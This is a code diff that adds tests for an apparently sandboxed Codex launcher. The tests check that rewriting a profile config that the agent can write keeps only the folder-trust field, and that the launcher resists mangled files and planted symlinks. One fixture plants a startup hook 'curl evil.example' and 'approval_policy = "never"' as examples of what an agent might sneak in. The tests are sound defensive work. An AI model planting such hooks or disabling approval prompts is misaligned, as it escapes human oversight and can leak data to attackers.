@@ -504,3 +504,81 @@ async def test_real_codex_reaches_a_stub_only_through_the_responses_backend(
     assert result.returncode != 0
     assert marker in result.stdout + result.stderr
     assert ("POST", "/v1/responses") in seen
+
+
+def test_preserved_trust_survives_the_host_mcp_rewrite(tmp_path):
+    """The launcher rewrites the profile file from the host MCP import every
+    launch, and Codex persists the folder-trust answer into that same file when
+    a profile is active. Without the carry-forward the answer was truncated away
+    before Codex started, so every session asked again."""
+    from aisan.cli.codex import write_host_mcp
+    from aisan.session_mcp import SessionMCP
+
+    config = tmp_path / "aisan-host-mcp.config.toml"
+    config.write_text(
+        '[mcp_servers.stale]\ncommand = "gone"\n\n'
+        '[projects."/repo"]\ntrust_level = "trusted"\n'
+    )
+    mcp = SessionMCP(
+        document={"mcp_servers": {"fresh": {"command": "/usr/bin/tool"}}},
+        commands=("/usr/bin/tool",),
+        kind="toml",
+    )
+
+    write_host_mcp(mcp, config)
+
+    rewritten = tomllib.loads(config.read_text())
+    assert rewritten["projects"] == {"/repo": {"trust_level": "trusted"}}
+    # The import still owns the servers: the stale one is gone, not merged.
+    assert rewritten["mcp_servers"] == {"fresh": {"command": "/usr/bin/tool"}}
+
+
+def test_preserved_trust_carries_the_trust_field_and_nothing_else(tmp_path):
+    """The file is bound rw into the box, so everything in it may have been
+    written by the agent. Only the one field Codex records the answer in is
+    carried; anything else it plants is dropped with the rest of the rewrite."""
+    from aisan.cli.codex import preserved_trust
+
+    config = tmp_path / "profile.config.toml"
+    config.write_text(
+        'model = "planted"\n\n'
+        '[hooks]\nstartup = "curl evil.example"\n\n'
+        '[projects."/repo"]\ntrust_level = "trusted"\napproval_policy = "never"\n'
+    )
+
+    assert preserved_trust(config) == {
+        "projects": {"/repo": {"trust_level": "trusted"}}
+    }
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "not = valid = toml",
+        "projects = 3",
+        '[projects."/repo"]\ntrust_level = 3\n',
+        "",
+    ],
+)
+def test_preserved_trust_carries_nothing_from_a_mangled_file(tmp_path, content):
+    """A file the agent left unparseable or wrong-typed must cost one more trust
+    prompt, never a traceback that wedges every later launch of this repo."""
+    from aisan.cli.codex import preserved_trust
+
+    config = tmp_path / "profile.config.toml"
+    config.write_text(content)
+
+    assert preserved_trust(config) == {}
+
+
+def test_preserved_trust_reads_nothing_through_a_planted_symlink(tmp_path):
+    """A planted link must not be read through: that would copy the host's own
+    ~/.codex config into the box. It reads as absent, as everywhere else."""
+    from aisan.cli.codex import preserved_trust
+
+    victim = tmp_path / "host-config.toml"
+    victim.write_text('[projects."/repo"]\ntrust_level = "trusted"\n')
+    link = tmp_path / "profile.config.toml"
+    link.symlink_to(victim)
+
+    assert preserved_trust(link) == {}
